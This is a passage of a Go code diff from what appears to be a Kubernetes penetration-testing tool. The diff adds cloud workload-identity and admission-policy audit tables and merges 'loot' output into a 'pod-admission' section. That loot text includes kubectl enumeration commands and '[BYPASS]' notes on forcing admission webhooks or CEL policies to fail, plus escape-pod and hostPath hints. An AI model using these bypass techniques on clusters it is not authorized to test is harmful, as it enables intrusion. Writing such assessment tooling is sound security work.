+		if strings.Contains(identity.RoleARN, ":role/Admin") || strings.Contains(identity.RoleARN, "AdministratorAccess") {
+			awsIssues = append(awsIssues, "Admin role attached")
+		}
+		issuesStr := "<NONE>"
+		if len(awsIssues) > 0 {
+			issuesStr = strings.Join(awsIssues, "; ")
+		}
+		awsPodIdentityRows = append(awsPodIdentityRows, []string{
+			identity.Name,
+			identity.Namespace,
+			identity.ServiceAccount,
+			identity.RoleARN,
+			shared.FormatBool(identity.HasWildcard),
+			issuesStr,
+		})
+	}
+
+	// Generate GCP Workload Identity detail rows
+	for _, identity := range gcpWorkloadIdentities {
+		var gcpIssues []string
+		if !identity.AnnotationPresent {
+			gcpIssues = append(gcpIssues, "Missing annotation")
+		}
+		if strings.Contains(identity.GSAEmail, "owner") || strings.Contains(identity.GSAEmail, "admin") {
+			gcpIssues = append(gcpIssues, "Privileged SA detected")
+		}
+		issuesStr := "<NONE>"
+		if len(gcpIssues) > 0 {
+			issuesStr = strings.Join(gcpIssues, "; ")
+		}
+		gcpWorkloadIdentityRows = append(gcpWorkloadIdentityRows, []string{
+			identity.Name,
+			identity.Namespace,
+			identity.KSAName,
+			identity.GSAEmail,
+			shared.FormatBool(identity.AnnotationPresent),
+			issuesStr,
+		})
+	}
+
+	// Generate Azure Workload Identity detail rows
+	for _, identity := range azureWorkloadIdentities {
+		var azureIssues []string
+		if !identity.HasFederated {
+			azureIssues = append(azureIssues, "Using legacy AAD Pod Identity")
+		}
+		if identity.Selector == "" || identity.Selector == "*" {
+			azureIssues = append(azureIssues, "Broad selector (overly permissive)")
+		}
+		issuesStr := "<NONE>"
+		if len(azureIssues) > 0 {
+			issuesStr = strings.Join(azureIssues, "; ")
+		}
+		azureWorkloadIdentityRows = append(azureWorkloadIdentityRows, []string{
+			identity.Name,
+			identity.Namespace,
+			identity.Kind,
+			identity.ClientID,
+			identity.TenantID,
+			identity.Selector,
+			shared.FormatBool(identity.HasFederated),
+			issuesStr,
+		})
+	}
+
+	// Generate Capsule Tenant Pod Policy detail rows
+	for _, policy := range capsuleTenantPodPolicies {
+		runtimeClasses := "<NONE>"
+		if len(policy.AllowedRuntimeClasses) > 0 {
+			runtimeClasses = strings.Join(policy.AllowedRuntimeClasses, ", ")
+		}
+		priorityClasses := "<NONE>"
+		if len(policy.AllowedPriorityClasses) > 0 {
+			priorityClasses = strings.Join(policy.AllowedPriorityClasses, ", ")
+		}
+		containerRegistries := "<NONE>"
+		if len(policy.ContainerRegistries) > 0 {
+			containerRegistries = strings.Join(policy.ContainerRegistries, ", ")
+		}
+		pss := policy.PodSecurityStandard
+		if pss == "" {
+			pss = "<NONE>"
+		}
+
+		var capsuleIssues []string
+		if policy.PodSecurityStandard == "" || policy.PodSecurityStandard == "privileged" {
+			capsuleIssues = append(capsuleIssues, "No PSS or privileged level")
+		}
+		if !policy.HasResourceQuotas {
+			capsuleIssues = append(capsuleIssues, "No resource quotas")
+		}
+		if !policy.HasLimitRanges {
+			capsuleIssues = append(capsuleIssues, "No limit ranges")
+		}
+		if len(policy.ContainerRegistries) == 0 {
+			capsuleIssues = append(capsuleIssues, "No registry restrictions")
+		}
+		issuesStr := "<NONE>"
+		if len(capsuleIssues) > 0 {
+			issuesStr = strings.Join(capsuleIssues, "; ")
+		}
+
+		capsuleTenantPodRows = append(capsuleTenantPodRows, []string{
+			policy.TenantName,
+			policy.Namespace,
+			pss,
+			runtimeClasses,
+			priorityClasses,
+			containerRegistries,
+			shared.FormatBool(policy.HasResourceQuotas),
+			shared.FormatBool(policy.HasLimitRanges),
+			issuesStr,
+		})
+	}
+
+	// Generate Rancher Project Pod Policy detail rows
+	for _, policy := range rancherProjectPodPolicies {
+		pspTemplate := policy.PSPTemplateID
+		if pspTemplate == "" {
+			pspTemplate = "<NONE>"
+		}
+
+		var rancherIssues []string
+		if !policy.HasPodSecurityPolicy {
+			rancherIssues = append(rancherIssues, "No PSP configured")
+		}
+		if !policy.ContainerResourceLimit {
+			rancherIssues = append(rancherIssues, "No container resource limits")
+		}
+		if !policy.NamespaceResourceQuota {
+			rancherIssues = append(rancherIssues, "No namespace resource quota")
+		}
+		issuesStr := "<NONE>"
+		if len(rancherIssues) > 0 {
+			issuesStr = strings.Join(rancherIssues, "; ")
+		}
+
+		rancherProjectPodRows = append(rancherProjectPodRows, []string{
+			policy.ProjectName,
+			policy.ProjectID,
+			policy.Namespace,
+			pspTemplate,
+			shared.FormatBool(policy.ContainerResourceLimit),
+			shared.FormatBool(policy.NamespaceResourceQuota),
+			shared.FormatBool(policy.HasPodSecurityPolicy),
+			issuesStr,
+		})
+	}
+
+	// Build unified policies table (merging all per-tool policies)
+	var unifiedPolicies []PodEnumeratedPolicy
+
+	// Add PSS policies from findings
+	for _, finding := range findings {
+		if finding.PSSEnforceLevel != "" {
+			details := fmt.Sprintf("Enforce: %s", finding.PSSEnforceLevel)
+			if finding.PSSEnforceVersion != "" {
+				details += fmt.Sprintf(" (v%s)", finding.PSSEnforceVersion)
+			}
+			unifiedPolicies = append(unifiedPolicies, PodEnumeratedPolicy{
+				Namespace: finding.Namespace,
+				Tool:      "PSS",
+				Name:      "pod-security.kubernetes.io/enforce",
+				Scope:     "Namespace",
+				Type:      "Enforce",
+				Details:   details,
+			})
+		}
+		if finding.PSSWarnLevel != "" {
+			details := fmt.Sprintf("Warn: %s", finding.PSSWarnLevel)
+			if finding.PSSWarnVersion != "" {
+				details += fmt.Sprintf(" (v%s)", finding.PSSWarnVersion)
+			}
+			unifiedPolicies = append(unifiedPolicies, PodEnumeratedPolicy{
+				Namespace: finding.Namespace,
+				Tool:      "PSS",
+				Name:      "pod-security.kubernetes.io/warn",
+				Scope:     "Namespace",
+				Type:      "Warn",
+				Details:   details,
+			})
+		}
+		if finding.PSSAuditLevel != "" {
+			details := fmt.Sprintf("Audit: %s", finding.PSSAuditLevel)
+			if finding.PSSAuditVersion != "" {
+				details += fmt.Sprintf(" (v%s)", finding.PSSAuditVersion)
+			}
+			unifiedPolicies = append(unifiedPolicies, PodEnumeratedPolicy{
+				Namespace: finding.Namespace,
+				Tool:      "PSS",
+				Name:      "pod-security.kubernetes.io/audit",
+				Scope:     "Namespace",
+				Type:      "Audit",
+				Details:   details,
+			})
+		}
+	}
+
+	// Add PSP policies
+	for _, psp := range pspAnalyses {
+		details := []string{}
+		if psp.AllowsPrivileged {
+			details = append(details, "Privileged")
+		}
+		if psp.AllowsHostNetwork {
+			details = append(details, "HostNetwork")
+		}
+		if psp.AllowsHostPID {
+			details = append(details, "HostPID")
+		}
+		if psp.AllowsHostPath {
+			details = append(details, "HostPath")
+		}
+		if len(psp.AllowedCapabilities) > 0 {
+			details = append(details, fmt.Sprintf("Caps: %s", strings.Join(psp.AllowedCapabilities, ",")))
+		}
+		detailStr := "<NONE>"
+		if len(details) > 0 {
+			detailStr = strings.Join(details, ", ")
+		}
+
+		unifiedPolicies = append(unifiedPolicies, PodEnumeratedPolicy{
+			Namespace: "<ALL>",
+			Tool:      "PSP",
+			Name:      psp.Name,
+			Scope:     "Cluster",
+			Type:      "PodSecurityPolicy",
+			Details:   detailStr,
+		})
+	}
+
+	// Add Webhook policies
+	for _, wh := range mutatingWebhooks {
+		details := fmt.Sprintf("FailurePolicy: %s", wh.FailurePolicy)
+		if wh.TimeoutSeconds > 0 {
+			details += fmt.Sprintf(", Timeout: %ds", wh.TimeoutSeconds)
+		}
+		unifiedPolicies = append(unifiedPolicies, PodEnumeratedPolicy{
+			Namespace: "<ALL>",
+			Tool:      "Webhook",
+			Name:      wh.Name,
+			Scope:     "Cluster",
+			Type:      "Mutating",
+			Details:   details,
+		})
+	}
+	for _, wh := range validatingWebhooks {
+		details := fmt.Sprintf("FailurePolicy: %s", wh.FailurePolicy)
+		if wh.TimeoutSeconds > 0 {
+			details += fmt.Sprintf(", Timeout: %ds", wh.TimeoutSeconds)
+		}
+		unifiedPolicies = append(unifiedPolicies, PodEnumeratedPolicy{
+			Namespace: "<ALL>",
+			Tool:      "Webhook",
+			Name:      wh.Name,
+			Scope:     "Cluster",
+			Type:      "Validating",
+			Details:   details,
+		})
+	}
+
+	// Add VAP policies
+	for _, vap := range vapPolicies {
+		failurePolicy := vap.FailurePolicy
+		if failurePolicy == "" {
+			failurePolicy = "Fail"
+		}
+		details := fmt.Sprintf("FailurePolicy: %s, Validations: %d", failurePolicy, vap.Validations)
+		if vap.ParamKind != "" {
+			details += fmt.Sprintf(", ParamKind: %s", vap.ParamKind)
+		}
+		unifiedPolicies = append(unifiedPolicies, PodEnumeratedPolicy{
+			Namespace: "<ALL>",
+			Tool:      "VAP",
+			Name:      vap.Name,
+			Scope:     "Cluster",
+			Type:      "ValidatingAdmissionPolicy",
+			Details:   details,
+		})
+	}
+
+	// Add Gatekeeper constraints
+	for _, constraint := range gatekeeperConstraints {
+		details := fmt.Sprintf("Enforcement: %s", constraint.EnforcementAction)
+		if constraint.Violations > 0 {
+			details += fmt.Sprintf(", Violations: %d", constraint.Violations)
+		}
+		unifiedPolicies = append(unifiedPolicies, PodEnumeratedPolicy{
+			Namespace: "<ALL>",
+			Tool:      "Gatekeeper",
+			Name:      constraint.Name,
+			Scope:     "Cluster",
+			Type:      constraint.Kind,
+			Details:   details,
+		})
+	}
+
+	// Add Kyverno policies
+	for _, policy := range kyvernoPolicies {
+		scope := "Cluster"
+		ns := "<ALL>"
+		if !policy.IsClusterPolicy {
+			scope = "Namespace"
+			ns = policy.Namespace
+		}
+		failureAction := policy.ValidationFailure
+		if failureAction == "" {
+			failureAction = "Audit"
+		}
+		details := fmt.Sprintf("FailureAction: %s, Rules: %d", failureAction, policy.Rules)
+
+		unifiedPolicies = append(unifiedPolicies, PodEnumeratedPolicy{
+			Namespace: ns,
+			Tool:      "Kyverno",
+			Name:      policy.Name,
+			Scope:     scope,
+			Type:      "Policy",
+			Details:   details,
+		})
+	}
+
+	// Add Kyverno exceptions
+	for _, exception := range kyvernoExceptions {
+		policiesStr := "<NONE>"
+		if len(exception.Policies) > 0 {
+			policiesStr = strings.Join(exception.Policies, ", ")
+		}
+		details := fmt.Sprintf("Exempts: %s", policiesStr)
+
+		unifiedPolicies = append(unifiedPolicies, PodEnumeratedPolicy{
+			Namespace: exception.Namespace,
+			Tool:      "Kyverno",
+			Name:      exception.Name,
+			Scope:     "Namespace",
+			Type:      "PolicyException",
+			Details:   details,
+		})
+	}
+
+	// Add Kubewarden policies
+	for _, policy := range kubewardenPolicies {
+		scope := "Cluster"
+		ns := "<ALL>"
+		if !policy.IsClusterPolicy {
+			scope = "Namespace"
+			ns = policy.Namespace
+		}
+		details := fmt.Sprintf("Mode: %s", policy.Mode)
+		if policy.Mutating {
+			details += ", Mutating: true"
+		}
+
+		unifiedPolicies = append(unifiedPolicies, PodEnumeratedPolicy{
+			Namespace: ns,
+			Tool:      "Kubewarden",
+			Name:      policy.Name,
+			Scope:     scope,
+			Type:      "AdmissionPolicy",
+			Details:   details,
+		})
+	}
+
+	// Add jsPolicy policies
+	for _, policy := range jsPolicies {
+		scope := "Cluster"
+		ns := "<ALL>"
+		if !policy.IsClusterPolicy {
+			scope = "Namespace"
+			ns = policy.Namespace
+		}
+		details := fmt.Sprintf("Type: %s", policy.Type)
+		if policy.ViolationPolicy != "" {
+			details += fmt.Sprintf(", ViolationPolicy: %s", policy.ViolationPolicy)
+		}
+
+		unifiedPolicies = append(unifiedPolicies, PodEnumeratedPolicy{
+			Namespace: ns,
+			Tool:      "jsPolicy",
+			Name:      policy.Name,
+			Scope:     scope,
+			Type:      policy.Type,
+			Details:   details,
+		})
+	}
+
+	// Add Gatekeeper exclusions
+	for _, excludedNs := range gatekeeperConfig.ExcludedNamespaces {
+		unifiedPolicies = append(unifiedPolicies, PodEnumeratedPolicy{
+			Namespace: excludedNs,
+			Tool:      "Gatekeeper",
+			Name:      "Config.spec.match.excludedNamespaces",
+			Scope:     "Cluster",
+			Type:      "Exclusion",
+			Details:   "Namespace excluded from Gatekeeper enforcement",
+		})
+	}
+
+	// Build unified policies table rows
+	unifiedPoliciesHeaders := []string{
+		"Namespace",
+		"Tool",
+		"Name",
+		"Scope",
+		"Type",
+		"Details",
+	}
+	var unifiedPoliciesRows [][]string
+	for _, policy := range unifiedPolicies {
+		unifiedPoliciesRows = append(unifiedPoliciesRows, []string{
+			policy.Namespace,
+			policy.Tool,
+			policy.Name,
+			policy.Scope,
+			policy.Type,
+			policy.Details,
 		})
 	}
 
 	// PSP-specific loot
 	if len(pspAnalyses) > 0 {
-		loot.Section("PSP").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("PSP").Add("# PSP ENUMERATION")
-		loot.Section("PSP").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("PSP").Add("")
-		loot.Section("PSP").Add("# List all PSPs:")
-		loot.Section("PSP").Add("kubectl get psp")
-		loot.Section("PSP").Add("")
+		loot.Section("pod-admission").Add("\n# ═══════════════════════════════════════════════════════════")
+		loot.Section("pod-admission").Add("# PSP ENUMERATION")
+		loot.Section("pod-admission").Add("# ═══════════════════════════════════════════════════════════")
+		loot.Section("pod-admission").Add("")
+		loot.Section("pod-admission").Add("# List all PSPs:")
+		loot.Section("pod-admission").Add("kubectl get psp")
+		loot.Section("pod-admission").Add("")
 
 		for _, psp := range pspAnalyses {
-			loot.Section("PSP").Addf("\n# ─────────────────────────────────────────────────────────────")
-			loot.Section("PSP").Addf("# PSP: %s", psp.Name)
-			loot.Section("PSP").Addf("# ─────────────────────────────────────────────────────────────")
-			loot.Section("PSP").Addf("kubectl get psp %s -o yaml", psp.Name)
-			loot.Section("PSP").Add("")
-			loot.Section("PSP").Add("# Security Configuration:")
-			loot.Section("PSP").Addf("#   Privileged: %t", psp.AllowsPrivileged)
-			loot.Section("PSP").Addf("#   HostNetwork: %t", psp.AllowsHostNetwork)
-			loot.Section("PSP").Addf("#   HostPID: %t", psp.AllowsHostPID)
-			loot.Section("PSP").Addf("#   HostIPC: %t", psp.AllowsHostIPC)
-			loot.Section("PSP").Addf("#   HostPath: %t", psp.AllowsHostPath)
+			loot.Section("pod-admission").Addf("\n# ─────────────────────────────────────────────────────────────")
+			loot.Section("pod-admission").Addf("# PSP: %s", psp.Name)
+			loot.Section("pod-admission").Addf("# ─────────────────────────────────────────────────────────────")
+			loot.Section("pod-admission").Addf("kubectl get psp %s -o yaml", psp.Name)
+			loot.Section("pod-admission").Add("")
+			loot.Section("pod-admission").Add("# Security Configuration:")
+			loot.Section("pod-admission").Addf("#   Privileged: %t", psp.AllowsPrivileged)
+			loot.Section("pod-admission").Addf("#   HostNetwork: %t", psp.AllowsHostNetwork)
+			loot.Section("pod-admission").Addf("#   HostPID: %t", psp.AllowsHostPID)
+			loot.Section("pod-admission").Addf("#   HostIPC: %t", psp.AllowsHostIPC)
+			loot.Section("pod-admission").Addf("#   HostPath: %t", psp.AllowsHostPath)
 			if len(psp.AllowedCapabilities) > 0 {
-				loot.Section("PSP").Addf("#   Dangerous Capabilities: %s", strings.Join(psp.AllowedCapabilities, ", "))
+				loot.Section("pod-admission").Addf("#   Dangerous Capabilities: %s", strings.Join(psp.AllowedCapabilities, ", "))
 			}
-			loot.Section("PSP").Add("")
+			loot.Section("pod-admission").Add("")
 
 			// Check which service accounts can use this PSP
-			loot.Section("PSP").Add("# Find service accounts that can use this PSP:")
-			loot.Section("PSP").Addf("kubectl get clusterrolebinding -o json | jq '.items[] | select(.roleRef.name==\"%s\") | {name: .metadata.name, subjects: .subjects}'", psp.Name)
-			loot.Section("PSP").Addf("kubectl get rolebinding --all-namespaces -o json | jq '.items[] | select(.roleRef.name==\"%s\") | {namespace: .metadata.namespace, name: .metadata.name, subjects: .subjects}'", psp.Name)
-			loot.Section("PSP").Add("")
+			loot.Section("pod-admission").Add("# Find service accounts that can use this PSP:")
+			loot.Section("pod-admission").Addf("kubectl get clusterrolebinding -o json | jq '.items[] | select(.roleRef.name==\"%s\") | {name: .metadata.name, subjects: .subjects}'", psp.Name)
+			loot.Section("pod-admission").Addf("kubectl get rolebinding --all-namespaces -o json | jq '.items[] | select(.roleRef.name==\"%s\") | {namespace: .metadata.namespace, name: .metadata.name, subjects: .subjects}'", psp.Name)
+			loot.Section("pod-admission").Add("")
 
 			// Exploitation commands if PSP allows dangerous configs
 			if psp.AllowsPrivileged || psp.AllowsHostPath || len(psp.AllowedCapabilities) > 0 {
-				loot.Section("PSP").Add("# EXPLOITATION:")
+				loot.Section("pod-admission").Add("# EXPLOITATION:")
 				if psp.AllowsPrivileged {
-					loot.Section("PSP").Add("# This PSP allows privileged containers - deploy escape pod")
+					loot.Section("pod-admission").Add("# This PSP allows privileged containers - deploy escape pod")
 				}
 				if psp.AllowsHostPath {
-					loot.Section("PSP").Add("# This PSP allows hostPath - mount host filesystem")
+					loot.Section("pod-admission").Add("# This PSP allows hostPath - mount host filesystem")
 				}
 				if len(psp.AllowedCapabilities) > 0 {
-					loot.Section("PSP").Addf("# This PSP allows dangerous capabilities: %s", strings.Join(psp.AllowedCapabilities, ", "))
+					loot.Section("pod-admission").Addf("# This PSP allows dangerous capabilities: %s", strings.Join(psp.AllowedCapabilities, ", "))
 				}
-				loot.Section("PSP").Add("")
+				loot.Section("pod-admission").Add("")
 			}
 		}
 	}
 
 	// Webhook-specific loot
 	if len(mutatingWebhooks) > 0 || len(validatingWebhooks) > 0 {
-		loot.Section("Webhooks").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("Webhooks").Add("# WEBHOOK ENUMERATION")
-		loot.Section("Webhooks").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("Webhooks").Add("")
-		loot.Section("Webhooks").Add("# List all admission webhooks:")
-		loot.Section("Webhooks").Add("kubectl get mutatingwebhookconfigurations")
-		loot.Section("Webhooks").Add("kubectl get validatingwebhookconfigurations")
-		loot.Section("Webhooks").Add("")
+		loot.Section("pod-admission").Add("\n# ═══════════════════════════════════════════════════════════")
+		loot.Section("pod-admission").Add("# WEBHOOK ENUMERATION")
+		loot.Section("pod-admission").Add("# ═══════════════════════════════════════════════════════════")
+		loot.Section("pod-admission").Add("")
+		loot.Section("pod-admission").Add("# List all admission webhooks:")
+		loot.Section("pod-admission").Add("kubectl get mutatingwebhookconfigurations")
+		loot.Section("pod-admission").Add("kubectl get validatingwebhookconfigurations")
+		loot.Section("pod-admission").Add("")
 
 		for _, wh := range mutatingWebhooks {
-			loot.Section("Webhooks").Addf("\n# ─────────────────────────────────────────────────────────────")
-			loot.Section("Webhooks").Addf("# Mutating Webhook: %s", wh.Name)
-			loot.Section("Webhooks").Addf("# ─────────────────────────────────────────────────────────────")
-			loot.Section("Webhooks").Addf("kubectl get mutatingwebhookconfiguration %s -o yaml", wh.Name)
-			loot.Section("Webhooks").Addf("# Failure Policy: %s", wh.FailurePolicy)
+			loot.Section("pod-admission").Addf("\n# ─────────────────────────────────────────────────────────────")
+			loot.Section("pod-admission").Addf("# Mutating Webhook: %s", wh.Name)
+			loot.Section("pod-admission").Addf("# ─────────────────────────────────────────────────────────────")
+			loot.Section("pod-admission").Addf("kubectl get mutatingwebhookconfiguration %s -o yaml", wh.Name)
+			loot.Section("pod-admission").Addf("# Failure Policy: %s", wh.FailurePolicy)
 			if wh.FailurePolicy == "Ignore" {
-				loot.Section("Webhooks").Add("#")
-				loot.Section("Webhooks").Add("# [BYPASS] failurePolicy=Ignore - webhook failures won't block pods")
-				loot.Section("Webhooks").Add("# Techniques to trigger webhook failure:")
-				loot.Section("Webhooks").Add("#   1. Network partition - block webhook endpoint")
-				loot.Section("Webhooks").Add("#   2. Timeout - slow response > timeoutSeconds")
-				loot.Section("Webhooks").Add("#   3. DNS failure - corrupt webhook service DNS")
-				loot.Section("Webhooks").Add("#   4. Certificate expiry - wait for TLS cert to expire")
+				loot.Section("pod-admission").Add("#")
+				loot.Section("pod-admission").Add("# [BYPASS] failurePolicy=Ignore - webhook failures won't block pods")
+				loot.Section("pod-admission").Add("# Techniques to trigger webhook failure:")
+				loot.Section("pod-admission").Add("#   1. Network partition - block webhook endpoint")
+				loot.Section("pod-admission").Add("#   2. Timeout - slow response > timeoutSeconds")
+				loot.Section("pod-admission").Add("#   3. DNS failure - corrupt webhook service DNS")
+				loot.Section("pod-admission").Add("#   4. Certificate expiry - wait for TLS cert to expire")
 			}
 			if wh.HasExclusions {
-				loot.Section("Webhooks").Add("#")
-				loot.Section("Webhooks").Add("# [BYPASS] Namespace selector configured - some namespaces excluded")
-				loot.Section("Webhooks").Add("# Check which namespaces are excluded:")
-				loot.Section("Webhooks").Addf("kubectl get mutatingwebhookconfiguration %s -o jsonpath='{.webhooks[*].namespaceSelector}'", wh.Name)
+				loot.Section("pod-admission").Add("#")
+				loot.Section("pod-admission").Add("# [BYPASS] Namespace selector configured - some namespaces excluded")
+				loot.Section("pod-admission").Add("# Check which namespaces are excluded:")
+				loot.Section("pod-admission").Addf("kubectl get mutatingwebhookconfiguration %s -o jsonpath='{.webhooks[*].namespaceSelector}'", wh.Name)
 			}
-			loot.Section("Webhooks").Add("")
+			loot.Section("pod-admission").Add("")
 		}
 
 		for _, wh := range validatingWebhooks {
-			loot.Section("Webhooks").Addf("\n# ─────────────────────────────────────────────────────────────")
-			loot.Section("Webhooks").Addf("# Validating Webhook: %s", wh.Name)
-			loot.Section("Webhooks").Addf("# ─────────────────────────────────────────────────────────────")
-			loot.Section("Webhooks").Addf("kubectl get validatingwebhookconfiguration %s -o yaml", wh.Name)
-			loot.Section("Webhooks").Addf("# Failure Policy: %s", wh.FailurePolicy)
+			loot.Section("pod-admission").Addf("\n# ─────────────────────────────────────────────────────────────")
+			loot.Section("pod-admission").Addf("# Validating Webhook: %s", wh.Name)
+			loot.Section("pod-admission").Addf("# ─────────────────────────────────────────────────────────────")
+			loot.Section("pod-admission").Addf("kubectl get validatingwebhookconfiguration %s -o yaml", wh.Name)
+			loot.Section("pod-admission").Addf("# Failure Policy: %s", wh.FailurePolicy)
 			if wh.FailurePolicy == "Ignore" {
-				loot.Section("Webhooks").Add("#")
-				loot.Section("Webhooks").Add("# [BYPASS] failurePolicy=Ignore - webhook failures won't block pods")
-				loot.Section("Webhooks").Add("# Techniques to trigger webhook failure:")
-				loot.Section("Webhooks").Add("#   1. Network partition - block webhook endpoint")
-				loot.Section("Webhooks").Add("#   2. Timeout - slow response > timeoutSeconds")
-				loot.Section("Webhooks").Add("#   3. DNS failure - corrupt webhook service DNS")
-				loot.Section("Webhooks").Add("#   4. Certificate expiry - wait for TLS cert to expire")
+				loot.Section("pod-admission").Add("#")
+				loot.Section("pod-admission").Add("# [BYPASS] failurePolicy=Ignore - webhook failures won't block pods")
+				loot.Section("pod-admission").Add("# Techniques to trigger webhook failure:")
+				loot.Section("pod-admission").Add("#   1. Network partition - block webhook endpoint")
+				loot.Section("pod-admission").Add("#   2. Timeout - slow response > timeoutSeconds")
+				loot.Section("pod-admission").Add("#   3. DNS failure - corrupt webhook service DNS")
+				loot.Section("pod-admission").Add("#   4. Certificate expiry - wait for TLS cert to expire")
 			}
 			if wh.HasExclusions {
-				loot.Section("Webhooks").Add("#")
-				loot.Section("Webhooks").Add("# [BYPASS] Namespace selector configured - some namespaces excluded")
-				loot.Section("Webhooks").Add("# Check which namespaces are excluded:")
-				loot.Section("Webhooks").Addf("kubectl get validatingwebhookconfiguration %s -o jsonpath='{.webhooks[*].namespaceSelector}'", wh.Name)
+				loot.Section("pod-admission").Add("#")
+				loot.Section("pod-admission").Add("# [BYPASS] Namespace selector configured - some namespaces excluded")
+				loot.Section("pod-admission").Add("# Check which namespaces are excluded:")
+				loot.Section("pod-admission").Addf("kubectl get validatingwebhookconfiguration %s -o jsonpath='{.webhooks[*].namespaceSelector}'", wh.Name)
 			}
-			loot.Section("Webhooks").Add("")
+			loot.Section("pod-admission").Add("")
 		}
 	}
 
 	// VAP-specific loot
 	if len(vapPolicies) > 0 {
-		loot.Section("VAP").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("VAP").Add("# VALIDATING ADMISSION POLICY ENUMERATION")
-		loot.Section("VAP").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("VAP").Add("")
-		loot.Section("VAP").Add("# List all ValidatingAdmissionPolicies:")
-		loot.Section("VAP").Add("kubectl get validatingadmissionpolicies")
-		loot.Section("VAP").Add("")
-		loot.Section("VAP").Add("# List all ValidatingAdmissionPolicyBindings:")
-		loot.Section("VAP").Add("kubectl get validatingadmissionpolicybindings")
-		loot.Section("VAP").Add("")
+		loot.Section("pod-admission").Add("\n# ═══════════════════════════════════════════════════════════")
+		loot.Section("pod-admission").Add("# VALIDATING ADMISSION POLICY ENUMERATION")
+		loot.Section("pod-admission").Add("# ═══════════════════════════════════════════════════════════")
+		loot.Section("pod-admission").Add("")
+		loot.Section("pod-admission").Add("# List all ValidatingAdmissionPolicies:")
+		loot.Section("pod-admission").Add("kubectl get validatingadmissionpolicies")
+		loot.Section("pod-admission").Add("")
+		loot.Section("pod-admission").Add("# List all ValidatingAdmissionPolicyBindings:")
+		loot.Section("pod-admission").Add("kubectl get validatingadmissionpolicybindings")
+		loot.Section("pod-admission").Add("")
 
 		for _, vap := range vapPolicies {
-			loot.Section("VAP").Addf("\n# ─────────────────────────────────────────────────────────────")
-			loot.Section("VAP").Addf("# VAP: %s", vap.Name)
-			loot.Section("VAP").Addf("# ─────────────────────────────────────────────────────────────")
-			loot.Section("VAP").Addf("kubectl get validatingadmissionpolicy %s -o yaml", vap.Name)
-			loot.Section("VAP").Addf("# Failure Policy: %s", vap.FailurePolicy)
-			loot.Section("VAP").Addf("# Validations: %d", vap.Validations)
+			loot.Section("pod-admission").Addf("\n# ─────────────────────────────────────────────────────────────")
+			loot.Section("pod-admission").Addf("# VAP: %s", vap.Name)
+			loot.Section("pod-admission").Addf("# ─────────────────────────────────────────────────────────────")
+			loot.Section("pod-admission").Addf("kubectl get validatingadmissionpolicy %s -o yaml", vap.Name)
+			loot.Section("pod-admission").Addf("# Failure Policy: %s", vap.FailurePolicy)
+			loot.Section("pod-admission").Addf("# Validations: %d", vap.Validations)
 			if len(vap.Bindings) > 0 {
-				loot.Section("VAP").Addf("# Bindings: %s", strings.Join(vap.Bindings, ", "))
-				loot.Section("VAP").Add("")
-				loot.Section("VAP").Add("# Check binding details:")
+				loot.Section("pod-admission").Addf("# Bindings: %s", strings.Join(vap.Bindings, ", "))
+				loot.Section("pod-admission").Add("")
+				loot.Section("pod-admission").Add("# Check binding details:")
 				for _, binding := range vap.Bindings {
-					loot.Section("VAP").Addf("kubectl get validatingadmissionpolicybinding %s -o yaml", binding)
+					loot.Section("pod-admission").Addf("kubectl get validatingadmissionpolicybinding %s -o yaml", binding)
 				}
 			}
 			if vap.FailurePolicy == "Ignore" {
-				loot.Section("VAP").Add("#")
-				loot.Section("VAP").Add("# [BYPASS] failurePolicy=Ignore - policy failures won't block")
-				loot.Section("VAP").Add("# Techniques to trigger CEL evaluation failure:")
-				loot.Section("VAP").Add("#   1. Send malformed data that causes CEL panic")
-				loot.Section("VAP").Add("#   2. Exceed expression evaluation cost limits")
+				loot.Section("pod-admission").Add("#")
+				loot.Section("pod-admission").Add("# [BYPASS] failurePolicy=Ignore - policy failures won't block")
+				loot.Section("pod-admission").Add("# Techniques to trigger CEL evaluation failure:")
+				loot.Section("pod-admission").Add("#   1. Send malformed data that causes CEL panic")
+				loot.Section("pod-admission").Add("#   2. Exceed expression evaluation cost limits")
 			}
-			loot.Section("VAP").Add("")
+			loot.Section("pod-admission").Add("")
 		}
 	}
 
 	// Gatekeeper-specific loot
 	if len(gatekeeperConstraints) > 0 {
-		loot.Section("Gatekeeper").Add("\n# ═══════════════════════════════════════════════════════════")
-		loot.Section("Gatekeeper").Add("# OPA GATEKEEPER ENUMERATION")
-		loot.Section("Gatekeeper").Add("# ═══════════════════════════════════════════════════════════")
-		loot.Section("Gatekeeper").Add("")
-		loot.Section("Gatekeeper").Add("# List all ConstraintTemplates:")
-		loot.Section("Gatekeeper").Add("kubectl get constrainttemplates")
-		loot.Section("Gatekeeper").Add("")
-		loot.Section("Gatekeeper").Add("# List all constraints across all templates:")
-		loot.Section("Gatekeeper").Add("kubectl get constraints")
-		loot.Section("Gatekeeper").Add("")
-		loot.Section("Gatekeeper").Add("# Check Gatekeeper system status:")
-		loot.Section("Gatekeeper").Add("kubectl get pods -n gatekeeper-system")
-		loot.Section("Gatekeeper").Add("kubectl logs -l control-plane=controller-manager -n gatekeeper-system --tail=50")
-		loot.Section("Gatekeeper").Add("")
+		loot.Section("pod-admission").Add("\n# ═══════════════════════════════════════════════════════════")
+		loot.Section("pod-admission").Add("# OPA GATEKEEPER ENUMERATION")
+		loot.Section("pod-admission").Add("# ═══════════════════════════════════════════════════════════")
+		loot.Section("pod-admission").Add("")
+		loot.Section("pod-admission").Add("# List all ConstraintTemplates:")
+		loot.Section("pod-admission").Add("kubectl get constrainttemplates")
+		loot.Section("pod-admission").Add("")
+		loot.Section("pod-admission").Add("# List all constraints across all templates:")
+		loot.Section("pod-admission").Add("kubectl get constraints")
+		loot.Section("pod-admission").Add("")
+		loot.Section("pod-admission").Add("# Check Gatekeeper system status:")
+		loot.Section("pod-admission").Add("kubectl get pods -n gatekeeper-system")
+		loot.Section("pod-admission").Add("kubectl logs -l control-plane=controller-manager -n gatekeeper-system --tail=50")
+		loot.Section("pod-admission").Add("")
 
 		// Group constraints by kind
 		constraintsByKind := make(map[string][]GatekeeperConstraintInfo)
@@ -1547,310 +2179,310 @@ func ListPodAdmission(cmd *cobra.Command, args []string) {
 		}
 
 		for kind, constraints := range constraintsByKind {
-			loot.Section("Gatekeeper").Addf("\n# ─────────────────────────────────────────────────────────────")
